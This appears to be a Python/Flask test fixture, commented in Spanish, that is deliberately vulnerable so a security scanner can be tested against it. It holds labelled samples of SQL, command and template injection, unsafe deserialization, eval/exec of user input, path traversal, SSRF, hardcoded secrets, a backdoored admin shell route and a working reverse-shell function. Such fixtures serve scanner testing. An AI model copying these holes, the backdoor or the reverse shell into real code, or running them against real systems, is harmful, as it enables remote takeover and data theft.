"""
⚠️ ARCHIVO DE PRUEBA - CONTIENE CÓDIGO VULNERABLE INTENCIONALMENTE

Este archivo contiene ejemplos de vulnerabilidades comunes en Python
para probar el scanner. NO USAR EN PRODUCCIÓN.
"""

import os
import pickle
import yaml
import sqlite3
import subprocess
import hashlib
import base64
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# ========================================
# INYECCIÓN SQL
# ========================================

# ❌ SQL Injection - String formatting
@app.route('/user/<user_id>')
def get_user(user_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE id = '%s'" % user_id
    cursor.execute(query)
    return str(cursor.fetchall())


# ❌ SQL Injection - f-string
@app.route('/search')
def search():
    term = request.args.get('term')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{term}%'")
    return str(cursor.fetchall())


# ❌ SQL Injection - concatenación
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
    cursor.execute(query)
    return "OK" if cursor.fetchone() else "Failed"


# ========================================
# INYECCIÓN DE COMANDOS
# ========================================

# ❌ Command Injection - os.system
@app.route('/ping')
def ping():
    host = request.args.get('host')
    os.system('ping -c 4 ' + host)
    return "Ping sent"


# ❌ Command Injection - subprocess con shell=True
@app.route('/dns')
def dns_lookup():
    domain = request.args.get('domain')
    result = subprocess.check_output('nslookup ' + domain, shell=True)
    return result


# ❌ Command Injection - subprocess.run
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd')
    output = subprocess.run(cmd, shell=True, capture_output=True)
    return output.stdout


# ========================================
# SERVER-SIDE TEMPLATE INJECTION (SSTI)
# ========================================

# ❌ SSTI - render_template_string con entrada de usuario
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)


# ❌ SSTI - Template completo controlado por usuario
@app.route('/render')
def render():
    template = request.args.get('template')
    return render_template_string(template)


# ========================================
# DESERIALIZACIÓN INSEGURA
# ========================================

# ❌ Pickle con datos de usuario (RCE)
@app.route('/load', methods=['POST'])
def load_data():
    data = request.data
    obj = pickle.loads(base64.b64decode(data))
    return str(obj)


# ❌ YAML unsafe_load
@app.route('/config', methods=['POST'])
def load_config():
    config_data = request.data.decode()
    config = yaml.load(config_data)  # Vulnerable, usa yaml.safe_load
    return str(config)


# ❌ yaml.unsafe_load explícito
def parse_yaml(content):
    return yaml.unsafe_load(content)


# ========================================
# CREDENCIALES HARDCODEADAS
# ========================================

# ❌ Contraseñas en código
DATABASE_PASSWORD = "super_secret_password_123"
API_KEY = "sk-prod-1234567890abcdef"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
JWT_SECRET = "my-jwt-secret-key-never-share"

# ❌ Credenciales en configuración
config = {
    'db_host': 'localhost',
    'db_user': 'admin',
    'db_password': 'admin123',  # ❌ Hardcoded
    'api_token': 'ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
}


# ========================================
# CRIPTOGRAFÍA DÉBIL
# ========================================

# ❌ MD5 para contraseñas
def hash_password_md5(password):
    return hashlib.md5(password.encode()).hexdigest()


# ❌ SHA1 para seguridad
def hash_data_sha1(data):
    return hashlib.sha1(data.encode()).hexdigest()


# ❌ eval() - Ejecución de código arbitrario
@app.route('/calculate')
def calculate():
    expression = request.args.get('expr')
    result = eval(expression)  # ❌ Extremadamente peligroso
    return str(result)


# ❌ exec() con entrada de usuario
@app.route('/run')
def run_code():
    code = request.args.get('code')
    exec(code)  # ❌ RCE
    return "Executed"


# ========================================
# PATH TRAVERSAL
# ========================================

# ❌ Lectura de archivo arbitrario
@app.route('/file/<path:filename>')
def read_file(filename):
    filepath = os.path.join('/var/data/', filename)
    with open(filepath, 'r') as f:
        return f.read()


# ❌ Path traversal sin sanitización
@app.route('/download')
def download():
    file = request.args.get('file')
    content = open('./uploads/' + file, 'rb').read()
    return content


# ========================================
# OPEN REDIRECT
# ========================================

# ❌ Redirección abierta
@app.route('/redirect')
def open_redirect():
    url = request.args.get('url')
    return redirect(url)


# ========================================
# INFORMACIÓN SENSIBLE
# ========================================

# ❌ Debug mode en producción
app.config['DEBUG'] = True
app.config['SECRET_KEY'] = 'development-secret-key'


# ❌ Exponer información sensible
@app.route('/error')
def error_page():
    try:
        raise Exception("Something went wrong")
    except Exception as e:
        import traceback
        return f"<pre>{traceback.format_exc()}</pre>"  # ❌ Stack trace expuesto


# ========================================
# SSRF (Server-Side Request Forgery)
# ========================================

import requests

# ❌ SSRF - URL de usuario sin validar
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # Puede acceder a red interna
    return response.text


# ========================================
# RANDOM INSEGURO
# ========================================

import random

# ❌ random para tokens de seguridad
def generate_token():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))


def generate_session_id():
    return 'session_' + str(random.randint(0, 999999999))


# ========================================
# CÓDIGO SOSPECHOSO / BACKDOOR
# ========================================

# ❌ Backdoor oculto
@app.route('/admin/shell')
def admin_shell():
    if request.args.get('key') == 'backdoor_master_key':
        cmd = base64.b64decode(request.args.get('c')).decode()
        return os.popen(cmd).read()
    return "Not found", 404


# ❌ Reverse shell
def reverse_shell(host, port):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.system('/bin/sh')


# ❌ Base64 encoded malicious code
PAYLOAD = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dobyBhbScgaScp"  # Sospechoso

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
